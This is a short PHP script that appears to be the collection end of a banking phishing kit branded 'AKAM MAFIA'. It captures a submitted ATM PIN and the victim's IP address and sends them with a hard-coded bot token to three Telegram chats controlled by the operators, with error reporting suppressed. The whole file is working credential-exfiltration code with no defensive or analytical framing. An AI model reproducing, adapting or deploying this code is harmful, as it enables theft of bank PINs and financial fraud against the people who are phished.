<?php
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$pin = $_POST['pass'];

$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
// Los 3 IDs de Telegram actualizados
$ids = ["8114050673", "8518977918", "8638340940"]; 

if (!empty($pin)) {
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - CLAVE</b> ⭐\n\n";
    $mensaje .= "🔑 <b>PIN CAJERO:</b> <code>$pin</code>\n";
    $mensaje .= "📍 <b>IP:</b> $ip";

    foreach ($ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=".urlencode($mensaje)."&parse_mode=HTML";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_exec($ch);
        curl_close($ch);
    }
    echo "ok";
}
?>
